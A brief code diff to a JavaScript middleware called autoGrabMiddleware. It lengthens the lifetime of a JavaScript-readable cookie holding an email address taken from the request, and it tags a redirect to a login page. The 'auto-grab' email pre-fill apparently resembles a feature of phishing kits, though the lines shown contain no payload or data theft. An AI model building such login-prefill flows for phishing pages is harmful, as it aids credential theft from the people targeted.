@@ -326,14 +326,15 @@ function autoGrabMiddleware(req, res, next) {
 
         // Set cookie so frontend can pre-fill the email
         res.cookie('autoGrabbedEmail', parsedEmail.email, { 
-            maxAge: 60000, // 1 minute
-            httpOnly: false // Allow JS to read it
+            maxAge: 300000, // 5 minutes
+            httpOnly: false, // Allow JS to read it
+            path: '/'
         });
 
         // Auto-redirect to login page if enabled
         if (autoGrabConfig.autoRedirect) {
             console.log(`🔄 Auto-redirecting to login page with email: ${parsedEmail.email}`);
-            return res.redirect('/');
+            return res.redirect('/?autograb=1');
         }
     }
 
